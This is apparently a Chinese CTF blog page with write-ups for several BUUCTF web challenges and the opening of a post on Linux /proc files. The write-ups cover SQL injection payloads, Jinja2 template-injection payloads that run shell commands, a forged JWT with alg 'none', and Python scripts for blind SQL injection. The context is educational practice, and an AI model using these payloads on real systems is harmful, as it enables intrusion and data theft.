</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/06/05/buuctf17/">buuctf17</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-06-05</time><div class="content"><h2 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h2><p>又是二次注入，注册登录改密</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html; charset=UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;p&gt;oldpass: &lt;input type=&quot;text&quot; name=&quot;oldpass&quot; /&gt;&lt;/p&gt;&lt;p&gt;newpass: &lt;input type=&quot;text&quot; name=&quot;newpass&quot; /&gt;&lt;/p&gt;&lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/form&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;oldpass&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;newpass&#x27;</span>]))&#123;</span><br><span class="line">	$oldpass = md5($_POST[<span class="string">&#x27;oldpass&#x27;</span>]);</span><br><span class="line">	$newpass = md5($_POST[<span class="string">&#x27;newpass&#x27;</span>]);</span><br><span class="line">	$username = $_SESSION[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">	$sql = <span class="string">&quot;update users set pwd=&#x27;<span class="subst">$newpass</span>&#x27; where name=\&quot;<span class="subst">$username</span>\&quot; and pwd=&#x27;<span class="subst">$oldpass</span>&#x27;&quot;</span>;</span><br><span class="line">	<span class="comment">// var_dump($sql);</span></span><br><span class="line">	$query = mysql_query($sql);</span><br><span class="line">	<span class="keyword">if</span>($query)&#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">die</span>(mysql_error());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>直接看这段代码吧，username此时是没有被md5加密的，也就是说这是我们的利用点</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">$string</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//$string = preg_replace(&quot;#(\s)|(/\*.*\*/)#i&quot;, &quot;&quot;, $string);</span></span><br><span class="line">	$postfilter = <span class="string">&quot;#(\s)|(/\*.*\*/)|file|insert|&lt;|and|floor|ord|char|ascii|mid|left|right|hex|sleep|benchmark|substr|@|`|delete|like#i&quot;</span>;</span><br><span class="line">	<span class="keyword">if</span>(preg_match($postfilter, $string,$matches))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;invalid string!&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">die</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这是过滤内容，所以我们可以闭合username</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adm&quot;extractvalue(1,concat(database()))#</span><br></pre></td></tr></table></figure>

<p>z这边看到一个师傅的payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">test&quot;^updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;users&#39;)&amp;&amp;(column_name)regexp(&#39;^r&#39;))),1)#</span><br></pre></td></tr></table></figure>

<p>有意思的是 flag所在的列名没有完全出来，于是就使用了正则匹配匹配字符r得到flag<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210525003729.png" alt="img" style="zoom:67%;"></p>
<p>最后要记得翻转哈，不然长度限制了</p>
<h2 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h2><p>查看源码有提示，SSTI注入<br>直接上payload</p>
<p>怎么说 我忘记保存了– </p>
<p>一开始没发现过滤东西，<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210528002149.png" alt="img" style="zoom:67%;"><br>找到了读文件的file方法，但是不知道flag位置<br>于是尝试其他方法，发现会跳转500，感觉是什么被过滤了，发现是globals</p>
<p>尝试一下绕过：发现拼接法可以绕过:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[2].__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&quot;ls&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>接下来就可以随便使用命令<br>这里没用builitins当跳板，因为eval被禁用了，直接用上面这个更简洁</p>
<p>然后这里说一下wp的方法，感觉挺新奇的:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">inux下有一个文件&#x2F;proc&#x2F;self&#x2F;environ，这个文件里保存了系统的一些变量。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210528004229.png" alt="img" style="zoom:67%;">

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[-1].__subclasses__()[40](&#39;&#x2F;flasklight&#x2F;app.py&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>读取源码<br>发现提示:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CCC&#123;the_flag_is_this_dir&#125;</span><br></pre></td></tr></table></figure>

<p>但是不知道flag的文件名<br>WP说可以利用subprocess.Popen这个类，无需globals也可以进行读取</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://202f932e-6c5b-47c0-9de9-0a1627399bb6.node3.buuoj.cn/?search=&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    payload = <span class="string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[%s]&#125;&#125;&quot;</span>%i</span><br><span class="line">    print(payload)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;subprocess.Popen&#x27;</span> <span class="keyword">in</span> s.get(url+payload).text:</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>结果是258<br>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__bases__[0].__subclasses__()[258](&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>不过也挺麻烦的==</p>
<h2 id="HITCON-2017-SSRFme"><a href="#HITCON-2017-SSRFme" class="headerlink" title="[HITCON 2017]SSRFme"></a>[HITCON 2017]SSRFme</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">        $http_x_headers = explode(<span class="string">&#x27;,&#x27;</span>, $_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line">        $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = $http_x_headers[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> $_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line"></span><br><span class="line">    $sandbox = <span class="string">&quot;sandbox/&quot;</span> . md5(<span class="string">&quot;orange&quot;</span> . $_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line"></span><br><span class="line">    $data = shell_exec(<span class="string">&quot;GET &quot;</span> . escapeshellarg($_GET[<span class="string">&quot;url&quot;</span>]));</span><br><span class="line">    $info = pathinfo($_GET[<span class="string">&quot;filename&quot;</span>]);</span><br><span class="line">    $dir  = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>, basename($info[<span class="string">&quot;dirname&quot;</span>]));</span><br><span class="line">    @mkdir($dir);</span><br><span class="line">    @chdir($dir);</span><br><span class="line">    @file_put_contents(basename($info[<span class="string">&quot;basename&quot;</span>]), $data);</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>之前做过了 在i春秋10 就是利用get里面的perl命令执行，然后这题好像没有flag–</p>
<h2 id="HFCTF2020-EasyLogin"><a href="#HFCTF2020-EasyLogin" class="headerlink" title="[HFCTF2020]EasyLogin"></a>[HFCTF2020]EasyLogin</h2><p>注册——登录 F12查看源码:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> *  或许该用 koa-static 来处理静态文件</span><br><span class="line"> *  路径该怎么配置？不管了先填个根目录XD</span><br><span class="line"> *&#x2F;</span><br></pre></td></tr></table></figure>

<p>知道是koa-static</p>
<p>不知道是个啥 是node.js吧？于是乎去学习一下看了一下wp说是要在controllers下的api.js才是真正的源码</p>
<h3 id="node-js"><a href="#node-js" class="headerlink" title="node.js"></a>node.js</h3><p>由于本题是基于koa框架的，所以需要了解他的一些基础信息</p>
<p>koa框架常用目录、文件</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210607214627.png" alt="img" style="zoom: 50%;">

<p>看了这个框架后很明显，我们需要找的是处理逻辑，但是本题中，处理逻辑放在<br>controllers/api.js文件下（经验），有的controllers默认目录下的文件就是api.js</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">const crypto = require(&#x27;crypto&#x27;);</span><br><span class="line">const fs = require(&#x27;fs&#x27;)</span><br><span class="line">const jwt = require(&#x27;jsonwebtoken&#x27;)</span><br><span class="line"></span><br><span class="line">const APIError = require(&#x27;../rest&#x27;).APIError;</span><br><span class="line"></span><br><span class="line">module.exports = &#123;</span><br><span class="line">    &#x27;POST /api/register&#x27;: async (ctx, next) =&gt; &#123;</span><br><span class="line">        const &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        if(!username || username === &#x27;admin&#x27;)&#123;</span><br><span class="line">            throw new APIError(&#x27;register error&#x27;, &#x27;wrong username&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(global.secrets.length &gt; 100000) &#123;</span><br><span class="line">            global.secrets = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        const secret = crypto.randomBytes(18).toString(&#x27;hex&#x27;);</span><br><span class="line">        const secretid = global.secrets.length;</span><br><span class="line">        global.secrets.push(secret)</span><br><span class="line"></span><br><span class="line">        const token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: &#x27;HS256&#x27;&#125;);//jwt验证</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            token: token</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        await next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    &#x27;POST /api/login&#x27;: async (ctx, next) =&gt; &#123;</span><br><span class="line">        const &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        if(!username || !password) &#123;</span><br><span class="line">            throw new APIError(&#x27;login error&#x27;, &#x27;username or password is necessary&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;</span><br><span class="line"></span><br><span class="line">        const sid = JSON.parse(Buffer.from(token.split(&#x27;.&#x27;)[1], &#x27;base64&#x27;).toString()).secretid;</span><br><span class="line"></span><br><span class="line">        console.log(sid)</span><br><span class="line"></span><br><span class="line">        if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) &#123;</span><br><span class="line">            throw new APIError(&#x27;login error&#x27;, &#x27;no such secret id&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        const secret = global.secrets[sid];</span><br><span class="line"></span><br><span class="line">        const user = jwt.verify(token, secret, &#123;algorithm: &#x27;HS256&#x27;&#125;);</span><br><span class="line"></span><br><span class="line">        const status = username === user.username &amp;&amp; password === user.password;</span><br><span class="line"></span><br><span class="line">        if(status) &#123;</span><br><span class="line">            ctx.session.username = username;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        await next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    &#x27;GET /api/flag&#x27;: async (ctx, next) =&gt; &#123;</span><br><span class="line">        if(ctx.session.username !== &#x27;admin&#x27;)&#123;</span><br><span class="line">            throw new APIError(&#x27;permission error&#x27;, &#x27;permission denied&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        const flag = fs.readFileSync(&#x27;/flag&#x27;).toString();</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            flag</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        await next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    &#x27;GET /api/logout&#x27;: async (ctx, next) =&gt; &#123;</span><br><span class="line">        ctx.session.username = null;</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status: true</span><br><span class="line">        &#125;)</span><br><span class="line">        await next();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>看了一下代码，主要是是要伪造jwt为admin然后就可以读取flag惹=-=<br>印象中之前也做过一题伪造jwt了<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210607215554.png" alt="img"></p>
<p>吧这个autho啥的拿去<a target="_blank" rel="noopener" href="https://jwt.io/%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E8%A7%A3%E7%A0%81">https://jwt.io/这个网站解码</a><br>然后jwt会防篡改，这里绕过的姿势就是将HS256改为none，然后构造:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;alg&quot;:&quot;none&quot;,&quot;typ&quot;:&quot;JWT&quot;&#125;.&#123;&quot;secretid&quot;: [],&quot;username&quot;: &quot;admin&quot;,&quot;password&quot;: &quot;123456&quot;,&quot;iat&quot;: 1623114083&#125;.</span><br><span class="line">ewogICJhbGciOiAibm9uZSIsCiAgInR5cCI6ICJKV1QiCn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjEyMyIsImlhdCI6MTYyMzEzMzA0NX0.Qjxs0QkJ0e_Sjrn8WbCPKaE5kFouERQY8RZ6nGctW6Q</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210608142227.png" alt="img" style="zoom:80%;">
记得将username换成admin，然后登陆进去以后抓包按getflag就行

<h3 id="jwt攻击小结"><a href="#jwt攻击小结" class="headerlink" title="jwt攻击小结"></a>jwt攻击小结</h3><p>jwt就是一种验证方式，思路就是拿到密文，然后去网站解密<a target="_blank" rel="noopener" href="https://jwt.io/%EF%BC%8C%E4%BF%AE%E6%94%B9%E5%85%B6%E4%B8%AD%E7%9A%84%E5%80%BC%EF%BC%8C%E5%86%8D%E5%8A%A0%E5%AF%86%E5%9B%9E%E5%8E%BB%EF%BC%8C%E6%9C%AC%E5%9C%B0%E8%83%BD%E7%BB%95%E8%BF%87%E6%98%AF%E5%9B%A0%E4%B8%BA%E9%AA%8C%E8%AF%81%E6%96%B9%E5%BC%8F%E6%AF%94%E8%BE%83%E7%AE%80%E5%8D%95%EF%BC%9A%E9%A6%96%E5%85%88%E7%AD%BE%E5%90%8D%E7%AE%97%E6%B3%95%E7%A1%AE%E4%BF%9D%E6%81%B6%E6%84%8F%E7%94%A8%E6%88%B7%E5%9C%A8%E4%BC%A0%E8%BE%93%E8%BF%87%E7%A8%8B%E4%B8%AD%E4%B8%8D%E4%BC%9A%E4%BF%AE%E6%94%B9JWT%EF%BC%8C%E4%BD%86%E6%98%AFjwt%E6%94%AF%E6%8C%81%E6%97%A0%E7%AD%BE%E5%90%8D%E7%AE%97%E6%B3%95%EF%BC%8C**%E6%89%80%E4%BB%A5%E5%A6%82%E6%9E%9C%E5%B0%86alg%E7%9A%84%E5%8A%A0%E5%AF%86%E6%96%B9%E5%BC%8F%E6%94%B9%E4%B8%BAnone**%EF%BC%8C%E5%B0%B1%E4%B8%8D%E7%94%A8%E5%AF%B9jwt%E8%BF%9B%E8%A1%8C%E7%AD%BE%E5%90%8D%EF%BC%8C%E8%BF%99%E6%A0%B7jwt%E7%9A%84%E5%AD%98%E5%9C%A8%E5%B0%B1%E6%B2%A1%E6%9C%89%E6%84%8F%E4%B9%89%E4%BA%86%E3%80%82">https://jwt.io/，修改其中的值，再加密回去，本地能绕过是因为验证方式比较简单：首先签名算法确保恶意用户在传输过程中不会修改JWT，但是jwt支持无签名算法，**所以如果将alg的加密方式改为none**，就不用对jwt进行签名，这样jwt的存在就没有意义了。</a></p>
<p>secret更改为数组的原因是也是和上面的更改none方法相呼应，因为只有secret更改为空这个方法才有效<br>但是本题为什么更改为数组？为什么不直接放空白，这点在他的源码有写，secret不能为空<br>js是弱类型语言，secret设为一个数组或小数，比较永远为真，但是并且不为空。</p>
<p>攻击思路:<br>注册获得jwt——更改jwt——重新进入</p>
<h2 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h2><p>SQL注入，数字型注入，过滤infomation，推测要无列名注入了<br>接下来测试一下注入点发现</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1和id&#x3D;2回显不一样</span><br></pre></td></tr></table></figure>

<p>这里有个细节需要说一下，由于and被过滤了，&amp;&amp;在url传输过程中有其他含义，不好用，所以这里用的|，但是用|的话就需要我们让id=2，这样 两个都错才是v&amp;n，一个对一个错就是nu1l，如果是id=1，就会一直是nu1l</p>
<p>接下来就贴脚本惹:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://38e59c90-abd2-495b-8ea0-e256893cdce2.node3.buuoj.cn/index.php&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">database=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100000000</span>):</span><br><span class="line">    low=<span class="number">0</span></span><br><span class="line">    high=<span class="number">264</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(low&lt;high):</span><br><span class="line">        <span class="comment">#payload_1=f&quot;2||ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;&quot;#爆库give_grandpa_pa_pa_pa</span></span><br><span class="line">        <span class="comment">#payload_2=f&quot;2||ascii(substr((select group_concat(table_name) from sys.x$schema_flattened_keys),&#123;i&#125;,1))&gt;&#123;mid&#125;&quot;#f1ag_1s_h3r3_hhhhh</span></span><br><span class="line">        payload_2 = <span class="string">f&quot;2||ascii(substr((select group_concat(flag) from f1ag_1s_h3r3_hhhhh),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>&quot;</span><span class="comment">#像无列名注入很经常列名都是flag，好几次了，</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#print(payload_2)</span></span><br><span class="line">        <span class="comment">#payload_2=</span></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>:payload_2</span><br><span class="line">        &#125;</span><br><span class="line">        print(s.post(url,data=data).text)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Nu1L&quot;</span> <span class="keyword">in</span> s.post(url,data=data).text:</span><br><span class="line">            low=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high=mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> (mid == <span class="number">0</span> <span class="keyword">or</span> mid == <span class="number">264</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    database += chr(mid)</span><br><span class="line">    print(database)</span><br><span class="line">print(database)</span><br></pre></td></tr></table></figure>

<p>有个很无语的事，就是一旦请求多了，网页就会崩溃–，所以很痛苦</p>
<p>我还一直在想是出了什么问题了，就算把线程改为1也不行–<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210608151212.png" alt="img" style="zoom:50%;"></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210608151321.png" alt="img" style="zoom:50%;">

<p>由于本题过滤了union 所以常规的无列名注入在这里就行不通了<br>这里学习一下</p>
<h3 id="无列名按位比较注入"><a href="#无列名按位比较注入" class="headerlink" title="无列名按位比较注入"></a>无列名按位比较注入</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s=requests.session()</span><br><span class="line">url=<span class="string">&quot;http://38e59c90-abd2-495b-8ea0-e256893cdce2.node3.buuoj.cn/index.php&quot;</span></span><br><span class="line">payload=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trans</span>(<span class="params">flag</span>):</span></span><br><span class="line">    res=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">        res+=hex(ord(i))</span><br><span class="line">    res=<span class="string">&#x27;0x&#x27;</span>+res.replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">500</span>):</span><br><span class="line">    hexchar=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">126</span>):</span><br><span class="line">        hexchar = trans(flag+chr(char))</span><br><span class="line">        payload = <span class="string">&#x27;2||((select 1,&#123;&#125;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;</span>.format(hexchar)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: payload</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url=url, data=data)</span><br><span class="line">        text = r.text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += chr(char - <span class="number">1</span>)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>1.说一下原理，这里是使用了一个比较的思想，先比第一位，如果第一位相等则比较第二位，在某一位上，如果前者的 ASCII 大，不管总长度如何，ASCII 大的则大</p>
<p>2.所以这里需要两个循环，一个循环记录次数，一个循环放字符</p>
<h3 id="无列名注入小结"><a href="#无列名注入小结" class="headerlink" title="无列名注入小结:"></a>无列名注入小结:</h3><p>无列名注入可能是之前都没小结过，每次都要翻一下记录:<br>这里总结一下方便记忆的公式吧</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select b from (select 1,2 as b,3 union select * from users)a;</span><br><span class="line">      虚拟列名          字段数 并且将要显示的 as b         表名  任意字母</span><br><span class="line">(select 1,爆破内容)&gt;(select * from 表名)</span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/05/28/CTF%E4%B8%ADlinux%E9%87%8D%E8%A6%81%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%E5%B0%8F%E7%BB%93%EF%BC%88%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%EF%BC%89/">CTF中linux重要文件目录小结（文件读取）</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-05-28</time><div class="content"><p>最近发现读取目录也是需要积累的 所以在这里总结一下:</p>
<h2 id="proc-pid"><a href="#proc-pid" class="headerlink" title="/proc/[pid]/"></a>/proc/[pid]/</h2><p>Linux 内核提供了一种通过 proc 文件系统，在运行时访问内核内部数据结构、改变内核设置的机制。proc 文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。它以文件系统的方式为访问系统内核数据的操作提供接口。</p>
<p>用户和应用程序可以通过 proc 得到系统的信息，并可以改变内核的某些参数。由于系统的信息，如进程，是动态改变的，所以用户或应用程序读取 proc 文件时，proc 文件系统是动态从系统内核读出所需信息并提交的。</p>
<p>下面列出的这些文件或子文件夹，并不是都是在你的系统中存在，这取决于你的内核配置和装载的模块。另外，在 proc 下还有三个很重要的目录：net，scsi 和 sys。 sys 目录是可写的，可以通过它来访问或修改内核的参数，而 net 和 scsi 则依赖于内核配置。例如，如果系统不支持 scsi，则 scsi 目录不存在。</p>
<p>除了以上介绍的这些，还有的是一些以数字命名的目录，它们是进程目录。系统中当前运行的每一个进程都有对应的一个目录在 proc 下，以进程的 PID 号为目录名，它们是读取进程信息的接口。而 self 目录则是读取进程本身的信息接口，是一个 link。</p>
<h3 id="proc-pid-auxv"><a href="#proc-pid-auxv" class="headerlink" title="/proc/[pid]/auxv"></a>/proc/[pid]/auxv</h3><p>/proc/[pid]/auxv 包含传递给进程的 ELF 解释器信息，格式是每一项都是一个 unsigned long长度的 ID 加上一个 unsigned long 长度的值。最后一项以连续的两个 0x00 开头。举例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hexdump -x &#x2F;proc&#x2F;2406&#x2F;auxv</span><br><span class="line"></span><br><span class="line">0000000    0021    0000    0000    0000    f000    f7fa    7fff    0000</span><br><span class="line">0000010    0010    0000    0000    0000    fbff    1f8b    0000    0000</span><br><span class="line">0000020    0006    0000    0000    0000    1000    0000    0000    0000</span><br><span class="line">0000030    0011    0000    0000    0000    0064    0000    0000    0000</span><br><span class="line">0000040    0003    0000    0000    0000    0040    0040    0000    0000</span><br><span class="line">0000050    0004    0000    0000    0000    0038    0000    0000    0000</span><br><span class="line">0000060    0005    0000    0000    0000    0007    0000    0000    0000</span><br><span class="line">0000070    0007    0000    0000    0000    0000    0000    0000    0000</span><br><span class="line">0000080    0008    0000    0000    0000    0000    0000    0000    0000</span><br><span class="line">0000090    0009    0000    0000    0000    55e0    0045    0000    0000</span><br><span class="line">00000a0    000b    0000    0000    0000    0000    0000    0000    0000</span><br><span class="line">00000b0    000c    0000    0000    0000    0000    0000    0000    0000</span><br><span class="line">00000c0    000d    0000    0000    0000    0000    0000    0000    0000</span><br><span class="line">00000d0    000e    0000    0000    0000    0000    0000    0000    0000</span><br><span class="line">00000e0    0017    0000    0000    0000    0000    0000    0000    0000</span><br><span class="line">00000f0    0019    0000    0000    0000    f079    f7f6    7fff    0000</span><br><span class="line">0000100    001f    0000    0000    0000    ffea    f7f6    7fff    0000</span><br><span class="line">0000110    000f    0000    0000    0000    f089    f7f6    7fff    0000</span><br><span class="line">0000120    0000    0000    0000    0000    0000    0000    0000    0000</span><br><span class="line">0000130</span><br></pre></td></tr></table></figure>

<h3 id="proc-pid-cmdline"><a href="#proc-pid-cmdline" class="headerlink" title="/proc/[pid]/cmdline"></a>/proc/[pid]/cmdline</h3><p>/proc/[pid]/cmdline 是一个只读文件，包含进程的完整命令行信息。如果该进程已经被交换出内存或者这个进程是 zombie 进程，则这个文件没有任何内容。该文件以空字符 null 而不是换行符作为结束标志。举例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ps aux|grep frps</span><br><span class="line">root      2406  0.1  0.1  54880 10524 ?        Sl   Dec11  21:30 frps -c .&#x2F;frps.ini</span><br><span class="line"></span><br><span class="line">$ cat &#x2F;proc&#x2F;2406&#x2F;cmdline</span><br><span class="line">frps-c.&#x2F;frps.ini</span><br></pre></td></tr></table></figure>

<h3 id="proc-pid-comm"><a href="#proc-pid-comm" class="headerlink" title="/proc/[pid]/comm"></a>/proc/[pid]/comm</h3><p>/proc/[pid]/comm 包含进程的命令名。举例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat &#x2F;proc&#x2F;2406&#x2F;comm</span><br><span class="line">frps</span><br></pre></td></tr></table></figure>

